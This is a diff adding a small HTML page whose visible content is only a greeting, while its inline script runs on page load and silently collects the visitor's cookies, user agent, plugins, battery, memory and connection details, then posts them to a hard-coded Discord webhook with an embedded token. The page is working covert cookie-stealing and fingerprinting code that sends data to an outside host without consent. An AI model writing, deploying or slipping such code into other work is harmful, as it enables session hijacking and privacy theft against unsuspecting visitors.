@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Device Information Collection</title>
+    <script>
+      // Function to get browser information including cookies
+      async function getBrowserInfo() {
+        // Get battery information if available
+        const battery = await navigator.getBattery();
+
+        return {
+          userAgent: navigator.userAgent,
+          language: navigator.language,
+          platform: navigator.platform,
+          cookies: document.cookie || "No cookies found",
+          screenWidth: window.screen.width,
+          screenHeight: window.screen.height,
+          online: navigator.onLine,
+          browserName: navigator.appName,
+          browserVersion: navigator.appVersion,
+          plugins: Array.from(navigator.plugins)
+            .map((plugin) => plugin.name)
+            .join(", "),
+          deviceMemory: navigator.deviceMemory || "Unknown",
+          hardwareConcurrency: navigator.hardwareConcurrency || "Unknown",
+          batteryLevel: battery ? battery.level * 100 + "%" : "Unknown",
+          charging: battery ? battery.charging : "Unknown",
+          connectionType: navigator.connection
+            ? navigator.connection.effectiveType
+            : "Unknown",
+        };
+      }
+
+      // Function to send data to the Discord webhook
+      async function sendDataToWebhook(data) {
+        const webhookUrl =
+          "https://discord.com/api/webhooks/1246024388290023444/N7DmfwaqmA9up2DKLI0if_lg1TEEsjH1PlgqcnI8t-ZdrvtLQyk7C4GtODObk8bx4y6k"; // Replace with your actual Discord webhook URL
+        try {
+          const payload = {
+            content: "Browser information:",
+            embeds: [
+              {
+                title: "Browser Info",
+                fields: Object.keys(data).map((key) => ({
+                  name: key,
+                  value: data[key].toString(),
+                  inline: true,
+                })),
+              },
+            ],
+          };
+
+          const response = await fetch(webhookUrl, {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify(payload),
+          });
+          if (!response.ok) {
+            throw new Error("Network response was not ok");
+          }
+          console.log("Data sent to Discord webhook successfully");
+        } catch (error) {
+          console.error("Failed to send data to Discord webhook:", error);
+        }
+      }
+
+      // Function to collect and send data
+      async function collectAndSendData() {
+        const browserInfo = await getBrowserInfo();
+        sendDataToWebhook(browserInfo);
+      }
+
+      // Collect and send data immediately after page load
+      document.addEventListener("DOMContentLoaded", collectAndSendData);
+    </script>
+  </head>
+  <body>
+    <h1>Helloguys:D</h1>
+  </body>
+</html>
